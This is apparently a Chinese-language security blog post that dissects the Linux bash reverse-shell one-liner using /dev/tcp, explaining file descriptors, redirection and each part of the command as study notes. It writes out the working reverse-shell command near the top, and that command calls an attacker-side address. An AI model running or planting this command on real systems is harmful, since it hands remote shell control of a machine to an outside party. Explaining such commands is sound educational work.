---
title: 关于Linux下反弹Shell命令的解释
date: 2021-04-28 16:07:58
tags:
- 基础
---

Linux下反弹shell最常用的一句命令：

``` shell
bash -c 'exec bash -i &>/dev/tcp/192.168.1.1/1337 <&1'
```

对这条命令的理解，以我个人经历而言，大概分为几个阶段
1. 知道怎么用，但是记不住，用的时候就百度；
2. 大概背过了，也能理解命令某些部分的含义，但仍然不清不楚；
3. 完全理解了命令的每一部分的含义，可以脱离死记硬背，并写出不同形式的命令；

说来惭愧，入行多年了，今天才完成第三步，这里仅作一次记录。
详细原理三言两语较难说清，这里简单提炼一下主要知识点。

--------------------

前置理论：
1. **Linux下的一切都是文件**；
2. Linux中的文件描述符：
 - 标准输入 - 0 （默认设备键盘）
 - 标准输出 - 1 （默认设备显示器）
 - 错误输出 - 2 （默认设备显示器）
3. bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令。

------------------

那么，下面简单拆解一下反弹shell的命令
`bash -c`：不解释了；
`bash -i`：表示启动一个交互式的Shell；
`&>`：表示将所有输出重定向；
`/dev/tcp/ip/port`：表示目标的地址*(Linux下一切皆是文件)*；
`<&1`：表示将标准输入重定向至标准输出的目标；

简而言之，`&>`实现了命令输入在攻击端完成，`<&1`实现了命令结果输出在攻击端。

---------------------

参考资料：

- [《鸟哥的Linux私房菜》](https://item.jd.com/12443890.html)
- [Linux反弹shell（一）文件描述符与重定向](https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/)
- [Linux 反弹shell（二）反弹shell的本质](https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/)

